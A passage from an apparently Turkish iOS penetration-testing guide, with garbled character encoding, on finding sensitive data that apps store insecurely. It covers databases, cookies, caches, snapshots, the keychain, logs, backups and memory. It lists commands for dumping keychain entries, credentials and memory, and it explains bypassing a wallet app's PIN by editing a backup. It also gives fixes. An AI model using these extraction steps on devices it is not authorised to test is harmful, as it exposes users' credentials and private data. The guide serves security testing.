[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) uygulamanÄ±zdaki nesnelerin model katmanÄ±nÄ± yÃ¶netmek iÃ§in bir Ã§erÃ§evedir. [Core Data, kalÄ±cÄ± depolama olarak SQLite'i kullanabilir](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ancak Ã§erÃ§eve kendisi bir veritabanÄ± deÄŸildir.\
CoreData, verilerini varsayÄ±lan olarak ÅŸifrelemez. Bununla birlikte, CoreData'ye ek bir ÅŸifreleme katmanÄ± ekleyebilirsiniz. Daha fazla ayrÄ±ntÄ± iÃ§in [GitHub Repo](https://github.com/project-imas/encrypted-core-data)'ya bakÄ±n.

Bir uygulamanÄ±n SQLite Core Data bilgilerini `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` yolunda bulabilirsiniz.

**EÄŸer SQLite'i aÃ§abilir ve hassas bilgilere eriÅŸebilirseniz, yanlÄ±ÅŸ yapÄ±landÄ±rmayÄ± buldunuz demektir.**

{% code title="iGoat'tan Kod" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase), SQLite Ã¼zerine inÅŸa edilmiÅŸ bir anahtar/deÄŸer deposudur.\
Yap veritabanlarÄ± sqlite veritabanlarÄ± olduÄŸundan, bunlarÄ± Ã¶nceki bÃ¶lÃ¼mde belirtilen amaÃ§lÄ± komutu kullanarak bulabilirsiniz.

### DiÄŸer SQLite VeritabanlarÄ±

UygulamalarÄ±n kendi sqlite veritabanlarÄ±nÄ± oluÅŸturmasÄ± yaygÄ±ndÄ±r. Bu veritabanlarÄ±nda **duyarlÄ± veriler** saklayabilir ve bunlarÄ± ÅŸifrelememiÅŸ olarak bÄ±rakabilirler. Bu nedenle, her veritabanÄ±nÄ± uygulamanÄ±n dizininde kontrol etmek her zaman ilginÃ§ olacaktÄ±r. Bu nedenle, verilerin kaydedildiÄŸi uygulama dizinine gidin (`/private/var/mobile/Containers/Data/Application/{APPID}`).
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ±

GeliÅŸtiricilere Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ± aracÄ±lÄ±ÄŸÄ±yla **veri depolama ve senkronizasyonu** imkanÄ± sunulmaktadÄ±r. JSON formatÄ±nda depolanan veriler, gerÃ§ek zamanlÄ± olarak tÃ¼m baÄŸlÄ± istemcilere senkronize edilir.

Firebase veritabanlarÄ±nda yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ veritabanlar iÃ§in nasÄ±l kontrol yapÄ±lacaÄŸÄ±nÄ± buradan bulabilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm veritabanlarÄ±

[Realm Objective-C](https://realm.io/docs/objc/latest/) ve [Realm Swift](https://realm.io/docs/swift/latest/) Apple tarafÄ±ndan saÄŸlanmayan gÃ¼Ã§lÃ¼ bir veri depolama alternatifi sunar. VarsayÄ±lan olarak, veriler ÅŸifrelenmeden depolanÄ±r ve ÅŸifreleme belirli yapÄ±landÄ±rmalar aracÄ±lÄ±ÄŸÄ±yla saÄŸlanabilir.

VeritabanlarÄ± ÅŸurada bulunur: `/private/var/mobile/Containers/Data/Application/{APPID}`. Bu dosyalarÄ± keÅŸfetmek iÃ§in ÅŸu gibi komutlar kullanÄ±labilir:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Bu veritabanÄ± dosyalarÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in [**Realm Studio**](https://github.com/realm/realm-studio) aracÄ± Ã¶nerilir.

Bir Realm veritabanÄ± iÃ§inde ÅŸifreleme uygulamak iÃ§in aÅŸaÄŸÄ±daki kod parÃ§acÄ±ÄŸÄ± kullanÄ±labilir:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite VeritabanlarÄ±

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios), **hafif** ve **yerleÅŸik** bir veritabanÄ± motoru olarak tanÄ±mlanmaktadÄ±r ve **belge odaklÄ±** (NoSQL) yaklaÅŸÄ±mÄ± benimsemektedir. **iOS** ve **macOS** iÃ§in yerel olarak tasarlanmÄ±ÅŸ olup, verilerin senkronizasyonunu sorunsuz bir ÅŸekilde saÄŸlar.

Bir cihazda potansiyel Couchbase veritabanlarÄ±nÄ± tanÄ±mlamak iÃ§in aÅŸaÄŸÄ±daki dizin incelenmelidir:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Ã‡erezler

iOS, uygulamalarÄ±n Ã§erezlerini her uygulamanÄ±n klasÃ¶rÃ¼ iÃ§indeki **`Library/Cookies/cookies.binarycookies`** iÃ§inde saklar. Bununla birlikte, geliÅŸtiriciler bazen bu Ã§erezleri **anahtarlÄ±k** iÃ§inde saklamayÄ± tercih eder Ã§Ã¼nkÃ¼ bahsi geÃ§en **Ã§erez dosyasÄ±na yedeklerden eriÅŸilebilir**.

Ã‡erez dosyasÄ±nÄ± incelemek iÃ§in [**bu python betiÄŸini**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) kullanabilir veya objection'Ä±n **`ios cookies get`** komutunu kullanabilirsiniz.\
**AyrÄ±ca objection'Ä± kullanarak** bu dosyalarÄ± JSON formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rebilir ve verileri inceleyebilirsiniz.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Ã–nbellek

NSURLSession varsayÄ±lan olarak **HTTP isteklerini ve yanÄ±tlarÄ±nÄ± Cache.db veritabanÄ±nda** saklar. Bu veritabanÄ±, eÄŸer tokenlar, kullanÄ±cÄ± adlarÄ± veya baÅŸka hassas bilgiler Ã¶nbelleÄŸe alÄ±ndÄ±ysa **hassas veriler** iÃ§erebilir. Ã–nbelleÄŸe alÄ±nan bilgileri bulmak iÃ§in uygulamanÄ±n veri dizinine (`/var/mobile/Containers/Data/Application/<UUID>`) gidin ve `/Library/Caches/<Bundle Identifier>` yolunu izleyin. **WebKit Ã¶nbelleÄŸi de Cache.db dosyasÄ±nda saklanmaktadÄ±r**. **Objection**, bu dosyayla `sqlite connect Cache.db` komutuyla etkileÅŸime girebilir, Ã§Ã¼nkÃ¼ bu **normal bir SQLite veritabanÄ±dÄ±r**.

Bu verilerin **Ã¶nbelleÄŸe alÄ±nmasÄ±nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± Ã¶nerilir**, Ã§Ã¼nkÃ¼ istekte veya yanÄ±tta hassas bilgiler iÃ§erebilir. AÅŸaÄŸÄ±daki liste, bunu baÅŸarmanÄ±n farklÄ± yollarÄ±nÄ± gÃ¶stermektedir:

1. Oturum kapatÄ±ldÄ±ktan sonra Ã¶nbelleÄŸe alÄ±nan yanÄ±tlarÄ±n kaldÄ±rÄ±lmasÄ± Ã¶nerilir. Apple'Ä±n saÄŸladÄ±ÄŸÄ± [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) adlÄ± yÃ¶ntemle bunu yapabilirsiniz. Bu yÃ¶ntemi aÅŸaÄŸÄ±daki gibi Ã§aÄŸÄ±rabilirsiniz:

`URLCache.shared.removeAllCachedResponses()`

Bu yÃ¶ntem, Cache.db dosyasÄ±ndaki tÃ¼m Ã¶nbelleÄŸe alÄ±nan istekleri ve yanÄ±tlarÄ± kaldÄ±racaktÄ±r.
2. Ã‡erezlerin avantajÄ±ndan faydalanmanÄ±za gerek yoksa, URLSession'Ä±n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) yapÄ±landÄ±rma Ã¶zelliÄŸini kullanmanÄ±z Ã¶nerilir, bu da Ã§erezleri ve Ã¶nbelleÄŸi kaydetmeyi devre dÄ±ÅŸÄ± bÄ±rakacaktÄ±r.

[Apple belgeleri](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Bir geÃ§ici oturum yapÄ±landÄ±rma nesnesi, varsayÄ±lan bir oturum yapÄ±landÄ±rmasÄ±yla (bkz. varsayÄ±lan) benzerdir, ancak karÅŸÄ±lÄ±k gelen oturum nesnesi Ã¶nbellekleri, kimlik bilgisi depolarÄ±nÄ± veya diske herhangi bir oturumla ilgili veriyi depolamaz. Bunun yerine, oturumla ilgili veriler RAM'de depolanÄ±r. Bir geÃ§ici oturumun verileri diske yazdÄ±ÄŸÄ± tek zaman, bir URL'nin iÃ§eriÄŸini bir dosyaya yazmasÄ±nÄ± sÃ¶ylediÄŸinizde olur.`
3. Ã–nbellek, [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) Ã¶nbellek politikasÄ±na ayarlanarak da devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir. Bu, Ã¶nbelleÄŸin hafÄ±zada veya diske herhangi bir ÅŸekilde saklanmasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakacaktÄ±r.

### AnlÄ±k GÃ¶rÃ¼ntÃ¼ler

Ev dÃ¼ÄŸmesine bastÄ±ÄŸÄ±nÄ±zda, iOS **mevcut ekranÄ±n bir anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r** ve uygulamaya geÃ§iÅŸi Ã§ok daha sorunsuz hale getirmek iÃ§in kullanÄ±r. Ancak, eÄŸer mevcut ekranda **hassas veriler** varsa, bu veriler **resimde saklanÄ±r** (bu, **yeniden baÅŸlatmalara karÅŸÄ±n kalÄ±cÄ±dÄ±r**). Bu, uygulamalar arasÄ±nda geÃ§iÅŸ yapmak iÃ§in ev ekranÄ±na Ã§ift dokunarak eriÅŸebileceÄŸiniz anlÄ±k gÃ¶rÃ¼ntÃ¼lerdir.

iPhone jailbreak yapÄ±lmamÄ±ÅŸsa, **saldÄ±rganÄ±n** bu ekran gÃ¶rÃ¼ntÃ¼lerini gÃ¶rmek iÃ§in **cihaza eriÅŸimi** **engellenmemiÅŸ** olmalÄ±dÄ±r. VarsayÄ±lan olarak, son anlÄ±k gÃ¶rÃ¼ntÃ¼ uygulamanÄ±n sandbox'Ä±nda `Library/Caches/Snapshots/` veya `Library/SplashBoard/Snapshots` klasÃ¶rÃ¼nde saklanÄ±r (gÃ¼venilir bilgisayarlar iOX 7.0'dan itibaren dosya sistemine eriÅŸemez).

Bu kÃ¶tÃ¼ davranÄ±ÅŸÄ± Ã¶nlemenin bir yolu, anlÄ±k gÃ¶rÃ¼ntÃ¼yÃ¼ almadan Ã¶nce duyarlÄ± verileri kaldÄ±rmak veya bir boÅŸ ekran kullanmaktÄ±r, bunu `ApplicationDidEnterBackground()` iÅŸlevini kullanarak yapabilirsiniz.

AÅŸaÄŸÄ±daki, varsayÄ±lan bir ekran gÃ¶rÃ¼ntÃ¼sÃ¼ ayarlayan Ã¶rnek bir dÃ¼zeltme yÃ¶ntemidir.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
**Objective-C:**
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
### Arka Plan Resmi AyarÄ±

Uygulama arka planda Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda `overlayImage.png` dosyasÄ±nÄ± arka plan resmi olarak ayarlar. Bu, `overlayImage.png` dosyasÄ±nÄ±n her zaman mevcut gÃ¶rÃ¼nÃ¼mÃ¼ geÃ§ersiz kÄ±lacaÄŸÄ±ndan hassas veri sÄ±zÄ±ntÄ±larÄ±nÄ± Ã¶nler.

### Keychain

iOS anahtar zincirine eriÅŸmek ve yÃ¶netmek iÃ§in, jailbreak yapÄ±lmÄ±ÅŸ cihazlar iÃ§in uygun olan [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) gibi araÃ§lar mevcuttur. AyrÄ±ca, benzer amaÃ§lar iÃ§in [**Objection**](https://github.com/sensepost/objection) `ios keychain dump` komutunu saÄŸlar.

#### **Kimlik Bilgilerini Saklama**

**NSURLCredential** sÄ±nÄ±fÄ±, hassas bilgileri doÄŸrudan anahtar zincirine kaydetmek iÃ§in idealdir ve NSUserDefaults veya diÄŸer sarmallara gerek kalmadan kullanÄ±lÄ±r. GiriÅŸ yaptÄ±ktan sonra kimlik bilgilerini saklamak iÃ§in aÅŸaÄŸÄ±daki Swift kodu kullanÄ±lÄ±r:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Storedaki bu kimlik bilgilerini Ã§Ä±karmak iÃ§in Objection'Ä±n `ios nsurlcredentialstorage dump` komutu kullanÄ±lÄ±r.

## **Ã–zel Klavyeler ve Klavye Ã–nbelleÄŸi**

iOS 8.0'dan itibaren kullanÄ±cÄ±lar, **Ayarlar > Genel > Klavye > Klavyeler** altÄ±nda yÃ¶netilebilen Ã¶zel klavye uzantÄ±larÄ± yÃ¼kleyebilirler. Bu klavyeler geniÅŸletilmiÅŸ iÅŸlevsellik sunarken, tuÅŸ vuruÅŸu kaydÄ± tutma ve verileri harici sunuculara iletim riski oluÅŸtururlar, ancak kullanÄ±cÄ±lar aÄŸ eriÅŸimi gerektiren klavyeler hakkÄ±nda bilgilendirilir. Uygulamalar, hassas bilgi giriÅŸi iÃ§in Ã¶zel klavyelerin kullanÄ±mÄ±nÄ± kÄ±sÄ±tlayabilir ve kÄ±sÄ±tlamalÄ±dÄ±r.

**GÃ¼venlik Ã–nerileri:**

* GÃ¼venliÄŸi artÄ±rmak iÃ§in Ã¼Ã§Ã¼ncÃ¼ taraf klavyelerin devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± Ã¶nerilir.
* iOS'un varsayÄ±lan klavyesinin otomatik dÃ¼zeltme ve otomatik Ã¶neriler Ã¶zelliklerine dikkat edilmelidir, Ã§Ã¼nkÃ¼ bu Ã¶zellikler hassas bilgileri `Library/Keyboard/{locale}-dynamic-text.dat` veya `/private/var/mobile/Library/Keyboard/dynamic-text.dat` konumunda bulunan Ã¶nbellek dosyalarÄ±na kaydedebilir. Bu Ã¶nbellek dosyalarÄ± dÃ¼zenli olarak hassas veriler aÃ§Ä±sÄ±ndan kontrol edilmelidir. Ã–nbellek verilerini temizlemek iÃ§in **Ayarlar > Genel > SÄ±fÄ±rla > Klavye SÃ¶zlÃ¼ÄŸÃ¼nÃ¼ SÄ±fÄ±rla** Ã¼zerinden klavye sÃ¶zlÃ¼ÄŸÃ¼nÃ¼ sÄ±fÄ±rlamak Ã¶nerilir.
* AÄŸ trafiÄŸinin dinlenmesi, Ã¶zel bir klavyenin tuÅŸ vuruÅŸlarÄ±nÄ± uzaktan iletip iletemediÄŸini ortaya Ã§Ä±karabilir.

### **Metin AlanÄ± Ã–nbelleÄŸini Ã–nleme**

[UITextInputTraits protokolÃ¼](https://developer.apple.com/reference/uikit/uitextinputtraits), otomatik dÃ¼zeltme ve gÃ¼venli metin giriÅŸini yÃ¶netmek iÃ§in gerekli olan Ã¶zellikleri sunar ve hassas bilgi Ã¶nbelleÄŸini Ã¶nlemek iÃ§in esastÄ±r. Ã–rneÄŸin, otomatik dÃ¼zeltmeyi devre dÄ±ÅŸÄ± bÄ±rakma ve gÃ¼venli metin giriÅŸini etkinleÅŸtirme ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilebilir:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Ek olarak, geliÅŸtiriciler metin alanlarÄ±nÄ±n, Ã¶zellikle ÅŸifreler ve PIN'ler gibi hassas bilgilerin girildiÄŸi alanlarÄ±n Ã¶nbelleÄŸe alÄ±nmasÄ±nÄ± engellemek iÃ§in `autocorrectionType`'Ä± `UITextAutocorrectionTypeNo` olarak ve `secureTextEntry`'i `YES` olarak ayarlayarak gÃ¼vence altÄ±na almalÄ±dÄ±r.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **KayÄ±tlar**

Hata ayÄ±klama kodu genellikle **gÃ¼nlÃ¼ÄŸÃ¼ kullanmayÄ±** gerektirir. **KayÄ±tlar hassas bilgiler iÃ§erebileceÄŸinden risk iÃ§erir**. Daha Ã¶nce, iOS 6 ve Ã¶nceki sÃ¼rÃ¼mlerinde, gÃ¼nlÃ¼klere tÃ¼m uygulamalar eriÅŸebiliyordu, bu da hassas veri sÄ±zÄ±ntÄ±sÄ± riski oluÅŸturuyordu. **Åimdi, uygulamalar yalnÄ±zca kendi gÃ¼nlÃ¼klerine eriÅŸebilirler**.

Bu kÄ±sÄ±tlamalara raÄŸmen, **kilitli bir cihaza fiziksel eriÅŸimi olan bir saldÄ±rgan**, cihazÄ± bir bilgisayara baÄŸlayarak bu durumu hala sÃ¶mÃ¼rebilir ve **kayÄ±tlarÄ± okuyabilir**. KayÄ±tlarÄ±n uygulamanÄ±n kaldÄ±rÄ±lmasÄ±ndan sonra bile diske kalmasÄ± Ã¶nemlidir.

Riskleri azaltmak iÃ§in, uygulama ile **etkileÅŸimi detaylÄ± bir ÅŸekilde** incelemek, tÃ¼m iÅŸlevlerini ve girdilerini keÅŸfetmek ve yanlÄ±ÅŸlÄ±kla hassas bilgilerin kaydedilmediÄŸinden emin olmak Ã¶nerilir.

Potansiyel sÄ±zÄ±ntÄ±lar iÃ§in uygulamanÄ±n kaynak kodunu inceleyerek, `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` gibi yerleÅŸik iÅŸlevler iÃ§in **Ã¶nceden tanÄ±mlanmÄ±ÅŸ** ve Ã¶zel gÃ¼nlÃ¼kleme ifadeleri iÃ§in `Logging` veya `Logfile` gibi anahtar kelimeleri arayÄ±n.

### **Sistem KayÄ±tlarÄ±nÄ± Ä°zleme**

Uygulamalar Ã§eÅŸitli hassas bilgileri kaydeder. Bu kayÄ±tlarÄ± izlemek iÃ§in, araÃ§lar ve komutlar gibi:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
AyrÄ±ca, **Xcode** konsol log'larÄ±nÄ± toplamanÄ±n bir yolunu saÄŸlar:

1. Xcode'u aÃ§Ä±n.
2. iOS cihazÄ±nÄ± baÄŸlayÄ±n.
3. **Window** -> **Devices and Simulators**'e gidin.
4. CihazÄ±nÄ±zÄ± seÃ§in.
5. AraÅŸtÄ±rdÄ±ÄŸÄ±nÄ±z sorunu tetikleyin.
6. LoglarÄ± yeni bir pencerede gÃ¶rÃ¼ntÃ¼lemek iÃ§in **Open Console** dÃ¼ÄŸmesini kullanÄ±n.

Daha geliÅŸmiÅŸ loglama iÃ§in, cihaz kabuÄŸuna baÄŸlanmak ve **socat** kullanarak gerÃ§ek zamanlÄ± log izleme saÄŸlayabilir.
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Log aktivitelerini gÃ¶zlemlemek iÃ§in kullanÄ±lan komutlar, sorunlarÄ± teÅŸhis etmek veya gÃ¼nlÃ¼klerde potansiyel veri sÄ±zÄ±ntÄ±larÄ±nÄ± belirlemek iÃ§in son derece deÄŸerli olabilir.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yedeklemeler

iOS'e entegre edilmiÅŸ **otomatik yedekleme Ã¶zellikleri**, iTunes (macOS Catalina'ya kadar), Finder (macOS Catalina'dan itibaren) veya iCloud aracÄ±lÄ±ÄŸÄ±yla cihaz veri kopyalarÄ±nÄ±n oluÅŸturulmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r. Bu yedeklemeler neredeyse tÃ¼m cihaz verilerini kapsar, Apple Pay ayrÄ±ntÄ±larÄ± ve Touch ID yapÄ±landÄ±rmalarÄ± gibi son derece hassas unsurlarÄ± hariÃ§ tutar.

### GÃ¼venlik Riskleri

Yedeklemelerde **kurulu uygulamalar ve verilerinin** bulunmasÄ±, potansiyel **veri sÄ±zÄ±ntÄ±sÄ±** sorununu ve **yedekleme deÄŸiÅŸikliklerinin uygulama iÅŸlevselliÄŸini deÄŸiÅŸtirebileceÄŸi riskini** ortaya Ã§Ä±karÄ±r. Bu riskleri azaltmak iÃ§in **duyarlÄ± bilgileri dÃ¼z metin olarak saklamamak** Ã¶nerilir.

### Yedeklemelerden DosyalarÄ± HariÃ§ Tutma

`Documents/` ve `Library/Application Support/` iÃ§indeki dosyalar varsayÄ±lan olarak yedeklenir. GeliÅŸtiriciler, `NSURLIsExcludedFromBackupKey` ile `NSURL setResourceValue:forKey:error:` kullanarak belirli dosyalarÄ± veya dizinleri yedeklemelerden hariÃ§ tutabilir. Bu uygulama, hassas verilerin yedeklemelere dahil edilmesini Ã¶nlemek iÃ§in Ã¶nemlidir.

### Zafiyetlerin Test Edilmesi

Bir uygulamanÄ±n yedekleme gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in, Finder kullanarak bir yedekleme oluÅŸturun ve ardÄ±ndan [Apple'Ä±n resmi belgelerinden](https://support.apple.com/en-us/HT204215) rehberlik alarak yedeÄŸi bulun. YedeÄŸi hassas veriler veya yapÄ±landÄ±rmalar aÃ§Ä±sÄ±ndan analiz ederek uygulama davranÄ±ÅŸÄ±nÄ± etkileyebilecek deÄŸiÅŸiklikler yapÄ±labilir.

Hassas bilgiler, komut satÄ±rÄ± araÃ§larÄ± veya [iMazing](https://imazing.com) gibi uygulamalar kullanÄ±larak aranabilir. Åifreli yedeklemeler iÃ§in, ÅŸifrelemenin varlÄ±ÄŸÄ±, yedeÄŸin kÃ¶kÃ¼nde bulunan "Manifest.plist" dosyasÄ±ndaki "IsEncrypted" anahtarÄ±nÄ± kontrol ederek doÄŸrulanabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
ÅifrelenmiÅŸ yedeklemelerle uÄŸraÅŸmak iÃ§in, [DinoSec'in GitHub deposundaki](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts) Python betikleri, Ã¶rneÄŸin **backup\_tool.py** ve **backup\_passwd.py**, son iTunes/Finder sÃ¼rÃ¼mleriyle uyumluluk iÃ§in ayarlamalar gerektirebilecek olsa da yararlÄ± olabilir. Åifre korumalÄ± yedeklemelerdeki dosyalara eriÅŸim iÃ§in baÅŸka bir seÃ§enek olan [**iOSbackup** aracÄ±](https://pypi.org/project/iOSbackup/) bulunmaktadÄ±r.

### Uygulama DavranÄ±ÅŸÄ±nÄ± DeÄŸiÅŸtirme

Yedekleme deÄŸiÅŸiklikleri aracÄ±lÄ±ÄŸÄ±yla uygulama davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirme Ã¶rneÄŸi, [Bither bitcoin cÃ¼zdan uygulamasÄ±nda](https://github.com/bither/bither-ios) gÃ¶sterilmektedir, burada UI kilidi PIN'inin **pin\_code** anahtarÄ± altÄ±nda `net.bither.plist` iÃ§inde saklandÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Bu anahtarÄ± plist'ten kaldÄ±rarak ve yedeÄŸi geri yÃ¼kleyerek PIN gereksinimini kaldÄ±rarak sÄ±nÄ±rsÄ±z eriÅŸim saÄŸlanabilir.

## Hassas Veriler Ä°Ã§in Bellek Testi Ã–zeti

Bir uygulamanÄ±n belleÄŸinde saklanan hassas bilgilerle uÄŸraÅŸÄ±rken, bu verilerin maruz kalma sÃ¼resini sÄ±nÄ±rlamak Ã§ok Ã¶nemlidir. Bellek iÃ§eriÄŸini araÅŸtÄ±rmak iÃ§in iki temel yaklaÅŸÄ±m vardÄ±r: **bir bellek dÃ¶kÃ¼mÃ¼ oluÅŸturmak** ve **belleÄŸi gerÃ§ek zamanlÄ± olarak analiz etmek**. Her iki yÃ¶ntemin de, dÃ¶kÃ¼m sÃ¼reci veya analiz sÄ±rasÄ±nda kritik verilerin kaÃ§Ä±rÄ±lma potansiyeli gibi zorluklarÄ± vardÄ±r.

## **Bir Bellek DÃ¶kÃ¼mÃ¼ AlÄ±p Analiz Etmek**

Hem jailbreak yapÄ±lmÄ±ÅŸ hem de yapÄ±lmamÄ±ÅŸ cihazlar iÃ§in, [objection](https://github.com/sensepost/objection) ve [Fridump](https://github.com/Nightbringer21/fridump) gibi araÃ§lar bir uygulamanÄ±n iÅŸlem belleÄŸini dÃ¶kme imkanÄ± saÄŸlar. Bir kez dÃ¶kÃ¼ldÃ¼ÄŸÃ¼nde, bu verilerin analizi, aradÄ±ÄŸÄ±nÄ±z bilginin doÄŸasÄ±na baÄŸlÄ± olarak Ã§eÅŸitli araÃ§lar gerektirir.

Bir bellek dÃ¶kÃ¼mÃ¼nden dizeleri Ã§Ä±karmak iÃ§in `strings` veya `rabin2 -zz` gibi komutlar kullanÄ±labilir:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Daha detaylÄ± bir analiz iÃ§in, belirli veri tÃ¼rleri veya desenler aramak iÃ§in **radare2**, kapsamlÄ± arama yetenekleri sunar:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ã‡alÄ±ÅŸma ZamanÄ± Bellek Analizi**

**r2frida**, bir uygulamanÄ±n belleÄŸini bir bellek dÃ¶kÃ¼mÃ¼ne ihtiyaÃ§ duymadan gerÃ§ek zamanlÄ± olarak incelemek iÃ§in gÃ¼Ã§lÃ¼ bir alternatif sunar. Bu araÃ§, Ã§alÄ±ÅŸan uygulamanÄ±n belleÄŸi Ã¼zerinde arama komutlarÄ±nÄ±n doÄŸrudan yÃ¼rÃ¼tÃ¼lmesini saÄŸlar:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## KÄ±rÄ±k Åifreleme

### ZayÄ±f Anahtar YÃ¶netimi SÃ¼reÃ§leri

BazÄ± geliÅŸtiriciler hassas verileri yerel depolamada saklar ve kodda sabit/tahmin edilebilir bir anahtarla ÅŸifreler. Bu yapÄ±lmamalÄ± Ã§Ã¼nkÃ¼ bazÄ± tersine mÃ¼hendislik saldÄ±rÄ±larÄ±, saldÄ±rganlarÄ±n gizli bilgileri Ã§Ä±karmasÄ±na izin verebilir.

### GÃ¼vensiz ve/veya KullanÄ±mdan KaldÄ±rÄ±lmÄ±ÅŸ AlgoritmalarÄ±n KullanÄ±mÄ±

